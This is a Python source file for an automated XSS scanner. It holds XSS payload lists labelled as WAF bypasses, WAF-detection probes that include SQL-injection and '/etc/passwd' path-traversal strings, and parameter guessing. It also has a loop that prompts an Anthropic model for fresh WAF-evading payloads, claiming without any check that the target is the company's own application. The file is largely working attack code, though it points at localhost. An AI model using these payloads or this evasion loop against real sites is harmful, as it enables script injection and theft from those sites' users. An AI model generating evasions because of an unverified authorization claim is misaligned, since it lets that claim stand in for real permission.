import asyncio
import json
import re
from typing import List, Dict, Optional, Set
from urllib.parse import urljoin, urlparse, parse_qs, urlencode
import aiohttp
from bs4 import BeautifulSoup
from playwright.async_api import async_playwright
import anthropic
import os
from datetime import datetime
from dotenv import load_dotenv

load_dotenv()

class XSSPayloadLibrary:
    """Comprehensive XSS payload library with bypass techniques"""
    
    BASIC_PAYLOADS = [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
        "javascript:alert(1)",
        "<iframe src=javascript:alert(1)>",
        "<body onload=alert(1)>",
    ]
    
    # Payloads designed to bypass WAF filters
    WAF_BYPASS_PAYLOADS = [
        # Alternative event handlers (not commonly blocked)
        "<img src=x onmouseover=alert(1)>",
        "<img src=x onanimationend=alert(1)>",
        "<input onfocus=alert(1) autofocus>",
        "<marquee onstart=alert(1)>",
        "<details open ontoggle=alert(1)>",
        
        # Case variation
        "<ScRiPt>alert(1)</ScRiPt>",
        "<iMg sRc=x OnErRoR=alert(1)>",
        
        # Space insertion
        "<img src=x on error=alert(1)>",
        "<svg on load=alert(1)>",
        
        # Self-closing tags
        "<svg/onload=alert(1)>",
        "<img/src=x/onerror=alert(1)>",
        
        # Using different quotes
        '<img src="x" onerror="alert(1)">',
        "<img src='x' onerror='alert(1)'>",
        "<img src=`x` onerror=`alert(1)`>",
        
        # Encoded payloads
        "<script>alert(String.fromCharCode(49))</script>",
        "<img src=x onerror=alert`1`>",
        
        # Alternative tags
        "<object data=javascript:alert(1)>",
        "<embed src=javascript:alert(1)>",
        
        # Breaking with comments
        "<scr<!---->ipt>alert(1)</script>",
        "<img src=x one<!---->rror=alert(1)>",
        
        # Unicode/Hex encoding
        "<script>al\u0065rt(1)</script>",
        "<img src=x onerror=\u0061lert(1)>",
    ]
    
    CONTEXT_SPECIFIC = {
        'javascript': [
            '\'-alert(1)-\'',
            '\';alert(1)//\'',
            '</script><script>alert(1)</script>',
        ],
        'attribute': [
            '" onmouseover="alert(1)',
            '\' onfocus=\'alert(1)\' autofocus \'',
        ]
    }

class SmartParameterDiscovery:
    """Intelligent parameter discovery system"""
    
    def __init__(self):
        # Common parameter names by category
        self.common_params = {
            'search': ['q', 'query', 'search', 's', 'keyword', 'term', 'find'],
            'id': ['id', 'uid', 'user_id', 'userid', 'user', 'account'],
            'page': ['page', 'p', 'pg', 'pagenum'],
            'filter': ['filter', 'category', 'cat', 'type', 'sort'],
            'content': ['content', 'text', 'message', 'msg', 'comment', 'body'],
            'url': ['url', 'link', 'redirect', 'return', 'callback'],
            'name': ['name', 'username', 'fname', 'lname', 'fullname'],
            'email': ['email', 'mail', 'e-mail'],
            'file': ['file', 'filename', 'upload', 'attachment'],
        }
    
    async def discover_from_page(self, url: str, html: str) -> Set[str]:
        """Discover parameters from HTML page"""
        discovered = set()
        soup = BeautifulSoup(html, 'html.parser')
        
        # Method 1: Form inputs
        for form in soup.find_all('form'):
            for input_tag in form.find_all(['input', 'textarea', 'select']):
                name = input_tag.get('name')
                if name:
                    discovered.add(name)
        
        # Method 2: Links with query parameters
        for link in soup.find_all('a', href=True):
            href = link['href']
            parsed = urlparse(urljoin(url, href))
            if parsed.query:
                params = parse_qs(parsed.query)
                discovered.update(params.keys())
        
        # Method 3: JavaScript analysis
        for script in soup.find_all('script'):
            script_text = script.string
            if script_text:
                # Find common parameter patterns in JS
                patterns = [
                    r'getParameter\(["\'](\w+)["\']\)',
                    r'params\.(\w+)',
                    r'request\.(\w+)',
                    r'\?(\w+)=',
                ]
                for pattern in patterns:
                    matches = re.findall(pattern, script_text)
                    discovered.update(matches)
        
        return discovered
    
    async def probe_endpoints(self, base_url: str, session: aiohttp.ClientSession) -> List[Dict]:
        """Probe common endpoints and parameter combinations"""
        discovered_inputs = []
        
        # Common endpoint patterns
        endpoints = [
            '/',
            '/search',
            '/profile',
            '/user',
            '/api/search',
            '/query',
        ]
        
        for endpoint in endpoints:
            url = urljoin(base_url, endpoint)
            
            try:
                async with session.get(url, timeout=5) as response:
                    if response.status == 200:
                        html = await response.text()
                        params = await self.discover_from_page(url, html)
                        
                        # Add discovered parameters
                        for param in params:
                            discovered_inputs.append({
                                'type': 'discovered',
                                'url': url,
                                'method': 'get',
                                'inputs': [{'name': param, 'type': 'discovered'}]
                            })
                        
                        # Also try common parameters for this endpoint
                        endpoint_type = self._categorize_endpoint(endpoint)
                        if endpoint_type in self.common_params:
                            for param in self.common_params[endpoint_type]:
                                if param not in params:  # Don't duplicate
                                    discovered_inputs.append({
                                        'type': 'common',
                                        'url': url,
                                        'method': 'get',
                                        'inputs': [{'name': param, 'type': 'common'}]
                                    })
            except:
                pass
        
        return discovered_inputs
    
    def _categorize_endpoint(self, endpoint: str) -> str:
        """Categorize endpoint to suggest relevant parameters"""
        endpoint = endpoint.lower()
        if 'search' in endpoint or 'query' in endpoint:
            return 'search'
        elif 'user' in endpoint or 'profile' in endpoint:
            return 'id'
        elif 'page' in endpoint:
            return 'page'
        else:
            return 'search'  # default

class EnhancedWAFDetector:
    """Enhanced WAF detection with behavior analysis"""
    
    async def detect(self, url: str, session: aiohttp.ClientSession) -> Dict:
        """Detect WAF through multiple techniques"""
        waf_info = {
            'detected': False,
            'type': None,
            'confidence': 0,
            'behaviors': []
        }
        
        # Test 1: Known malicious payload
        test_payloads = [
            "<script>alert(1)</script>",
            "' OR '1'='1",
            "../../../etc/passwd"
        ]
        
        for payload in test_payloads:
            try:
                async with session.get(f"{url}?test={payload}", timeout=5) as response:
                    status = response.status
                    headers = dict(response.headers)
                    text = await response.text()
                    
                    # Check for WAF signatures
                    if status == 403:
                        waf_info['detected'] = True
                        waf_info['behaviors'].append('blocks_403')
                    
                    # Check headers
                    waf_headers = {
                        'cloudflare': ['cf-ray', 'cf-cache-status'],
                        'akamai': ['akamai-ghost'],
                        'modsecurity': ['x-mod-security'],
                    }
                    
                    for waf_name, waf_header_list in waf_headers.items():
                        for header in waf_header_list:
                            if header.lower() in [h.lower() for h in headers.keys()]:
                                waf_info['type'] = waf_name
                                waf_info['confidence'] = 0.9
                                waf_info['detected'] = True
                    
                    # Check response body for WAF signatures
                    if 'forbidden' in text.lower() and 'waf' in text.lower():
                        waf_info['detected'] = True
                        waf_info['behaviors'].append('waf_message')
                    
                    break  # Found blocking behavior
            except:
                pass
        
        return waf_info

class AIPayloadGenerator:
    """Enhanced AI payload generator with learning"""
    
    def __init__(self, api_key: str):
        self.client = anthropic.Anthropic(api_key=api_key)
        self.model = "claude-sonnet-4-20250514"
        self.successful_bypasses = []
    
    async def generate_bypass_payloads(self, blocked_payload: str, 
                                      context: Dict, waf_info: Dict,
                                      response_info: Dict) -> List[str]:
        
        # Build context from previous successful bypasses
        learning_context = ""
        if self.successful_bypasses:
            learning_context = f"\n\nPrevious successful bypasses:\n"
            for bypass in self.successful_bypasses[-3:]:
                learning_context += f"- Blocked: {bypass['blocked']}\n  Success: {bypass['bypass']}\n"
        
        prompt = f"""You are an expert security researcher testing XSS vulnerabilities on OUR OWN company's application.

SCENARIO:
- Payload blocked by WAF: {blocked_payload}
- WAF Type: {waf_info.get('type', 'Unknown')}
- Response Status: {response_info.get('status', 'N/A')}
- Context: {json.dumps(context, indent=2)}
{learning_context}

TASK: Generate 7 creative XSS bypass payloads that might evade this WAF.

TECHNIQUES TO CONSIDER:
1. Alternative event handlers (onmouseover, onanimationend, ontoggle, etc.)
2. Case variation and mixed case
3. Space insertion in attributes
4. Self-closing tags with /
5. Different quote styles
6. Unicode/hex encoding
7. HTML comment insertion
8. Alternative tags (marquee, details, object, embed)
9. Template literals with backticks
10. Breaking detection with null bytes or special characters

IMPORTANT: 
- Focus on bypasses that work in modern browsers
- Use creative combinations
- Think about what the WAF is specifically blocking

Respond ONLY with a valid JSON array:
["payload1", "payload2", "payload3", "payload4", "payload5", "payload6", "payload7"]"""

        try:
            response = self.client.messages.create(
                model=self.model,
                max_tokens=1500,
                messages=[{"role": "user", "content": prompt}]
            )
            
            content = response.content[0].text
            content = content.replace('```json', '').replace('```', '').strip()
            payloads = json.loads(content)
            
            print(f"    [AI] Generated {len(payloads)} bypass payloads")
            return payloads
        
        except Exception as e:
            print(f"    [!] AI generation error: {e}")
            return self._fallback_bypasses(blocked_payload)
    
    def record_success(self, blocked_payload: str, successful_bypass: str):
        """Record successful bypass for learning"""
        self.successful_bypasses.append({
            'blocked': blocked_payload,
            'bypass': successful_bypass,
            'timestamp': datetime.now().isoformat()
        })
        print(f"    [📚] Learned new bypass technique!")
    
    def _fallback_bypasses(self, payload: str) -> List[str]:
        """Fallback bypasses if AI fails"""
        return [
            payload.replace('onerror', 'onmouseover'),
            payload.replace('>', ' >'),
            payload.replace('<', '< '),
            f"<marquee onstart={payload.split('=')[1] if '=' in payload else 'alert(1)'}",
            payload.replace('script', 'ScRiPt'),
        ]

class EnhancedXSSScanner:
    """Enhanced scanner with smart discovery and AI bypasses"""
    
    def __init__(self, api_key: str):
        self.payload_library = XSSPayloadLibrary()
        self.waf_detector = EnhancedWAFDetector()
        self.ai_generator = AIPayloadGenerator(api_key)
        self.param_discovery = SmartParameterDiscovery()
        self.findings = []
        self.total_tests = 0
        self.blocks_encountered = 0
    
    async def scan(self, target_url: str):
        """Main scanning function with enhanced discovery"""
        print(f"\n{'='*70}")
        print(f"🤖 AI-POWERED XSS SCANNER WITH SMART DISCOVERY")
        print(f"{'='*70}")
        print(f"[*] Target: {target_url}")
        print(f"[*] Started: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
        
        async with aiohttp.ClientSession() as session:
            # Test connectivity
            try:
                async with session.get(target_url, timeout=5) as response:
                    if response.status != 200:
                        print(f"[!] Warning: Target returned status {response.status}")
            except Exception as e:
                print(f"[!] Error: Cannot connect to {target_url}")
                print(f"[!] Make sure the application is running!")
                return
            
            # Step 1: WAF Detection
            print("[1] 🛡️  Detecting WAF...")
            waf_info = await self.waf_detector.detect(target_url, session)
            if waf_info['detected']:
                print(f"    [+] WAF Detected: {waf_info['type'] or 'Unknown'}")
                print(f"    [+] Confidence: {waf_info['confidence']*100:.0f}%")
                print(f"    [+] Behaviors: {', '.join(waf_info['behaviors'])}")
            else:
                print(f"    [+] No WAF detected")
            
            # Step 2: Smart Parameter Discovery
            print(f"\n[2] 🔍 Discovering input vectors...")
            inputs = await self.param_discovery.probe_endpoints(target_url, session)
            
            discovered_count = len([i for i in inputs if i['type'] == 'discovered'])
            common_count = len([i for i in inputs if i['type'] == 'common'])
            
            print(f"    [+] Found {discovered_count} parameters from page analysis")
            print(f"    [+] Testing {common_count} common parameter names")
            print(f"    [+] Total input vectors: {len(inputs)}\n")
            
            # Step 3: Test each input
            print(f"[3] 🎯 Testing for XSS vulnerabilities...\n")
            for idx, input_vector in enumerate(inputs, 1):
                print(f"[Test {idx}/{len(inputs)}]")
                print(f"    URL: {input_vector['url']}")
                print(f"    Parameter: {input_vector['inputs'][0]['name']} ({input_vector['type']})")
                
                await self._test_input_vector(input_vector, waf_info, session)
                print()
        
        # Final Report
        self._generate_report()
    
    async def _test_input_vector(self, input_vector: Dict, 
                                 waf_info: Dict, session: aiohttp.ClientSession):
        """Test input with basic payloads then AI bypasses"""
        
        # Start with WAF bypass payloads if WAF detected
        if waf_info['detected']:
            payloads = self.payload_library.WAF_BYPASS_PAYLOADS[:5]
        else:
            payloads = self.payload_library.BASIC_PAYLOADS[:5]
        
        for payload in payloads:
            self.total_tests += 1
            result = await self._test_payload(input_vector, payload, session)
            
            if result['success']:
                print(f"    [!] ✅ VULNERABILITY FOUND!")
                print(f"        Payload: {payload}")
                self.findings.append({
                    'url': input_vector['url'],
                    'parameter': input_vector['inputs'][0]['name'],
                    'payload': payload,
                    'severity': 'HIGH',
                    'verified': result.get('verified', False)
                })
                return  # Found vuln, move to next input
            
            elif result['blocked']:
                self.blocks_encountered += 1
                print(f"    [~] ❌ Blocked by WAF")
                print(f"    [*] 🤖 Activating AI bypass engine...")
                
                # Use AI to generate bypasses
                ai_payloads = await self.ai_generator.generate_bypass_payloads(
                    blocked_payload=payload,
                    context=result.get('context', {}),
                    waf_info=waf_info,
                    response_info=result
                )
                
                # Test AI-generated payloads
                for ai_payload in ai_payloads:
                    self.total_tests += 1
                    print(f"    [AI Test] {ai_payload[:60]}...")
                    
                    ai_result = await self._test_payload(input_vector, ai_payload, session)
                    
                    if ai_result['success']:
                        print(f"    [!] 🎉 AI BYPASS SUCCESSFUL!")
                        self.findings.append({
                            'url': input_vector['url'],
                            'parameter': input_vector['inputs'][0]['name'],
                            'payload': ai_payload,
                            'severity': 'CRITICAL',
                            'bypass_technique': 'AI-generated',
                            'original_blocked': payload
                        })
                        # Learn from success
                        self.ai_generator.record_success(payload, ai_payload)
                        return
                
                return  # Stop after AI attempts
    
    async def _test_payload(self, input_vector: Dict, payload: str,
                           session: aiohttp.ClientSession) -> Dict:
        """Test single payload"""
        try:
            url = input_vector['url']
            param_name = input_vector['inputs'][0]['name']
            
            async with session.get(url, params={param_name: payload}, 
                                 timeout=10, allow_redirects=False) as response:
                status = response.status
                html = await response.text()
            
            # Check if blocked
            if status in [403, 406]:
                return {'success': False, 'blocked': True, 'status': status}
            
            # Check if reflected
            if payload in html:
                # Check if actually executable
                if any(marker in html for marker in ['<script>', 'onerror=', 'onload=', 'onmouseover=']):
                    return {'success': True, 'blocked': False, 'verified': True}
            
            return {'success': False, 'blocked': False}
        
        except Exception as e:
            return {'success': False, 'blocked': False, 'error': str(e)}
    
    def _generate_report(self):
        """Generate comprehensive report"""
        print(f"\n{'='*70}")
        print(f"📊 SCAN REPORT")
        print(f"{'='*70}")
        print(f"Total Tests Run: {self.total_tests}")
        print(f"WAF Blocks Encountered: {self.blocks_encountered}")
        print(f"Vulnerabilities Found: {len(self.findings)}")
        print(f"{'='*70}\n")
        
        if self.findings:
            for idx, finding in enumerate(self.findings, 1):
                print(f"[Vulnerability #{idx}]")
                print(f"  🎯 URL: {finding['url']}")
                print(f"  📌 Parameter: {finding['parameter']}")
                print(f"  💉 Payload: {finding['payload']}")
                print(f"  ⚠️  Severity: {finding['severity']}")
                if 'bypass_technique' in finding:
                    print(f"  🤖 Method: {finding['bypass_technique']}")
                    print(f"  🚫 Original blocked: {finding['original_blocked']}")
                print()
        else:
            print("✅ No vulnerabilities found!")
        
        # Save report
        report_file = f"xss_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        with open(report_file, 'w') as f:
            json.dump({
                'findings': self.findings,
                'stats': {
                    'total_tests': self.total_tests,
                    'blocks': self.blocks_encountered
                },
                'timestamp': datetime.now().isoformat()
            }, f, indent=2)
        
        print(f"💾 Report saved: {report_file}\n")

async def main():
    api_key = os.getenv('ANTHROPIC_API_KEY')
    
    if not api_key:
        print("[!] Error: ANTHROPIC_API_KEY not found")
        print("[!] Set it in .env file or environment variable")
        return
    
    target_url = "http://localhost:8080"
    
    scanner = EnhancedXSSScanner(api_key)
    await scanner.scan(target_url)

if __name__ == "__main__":
    asyncio.run(main())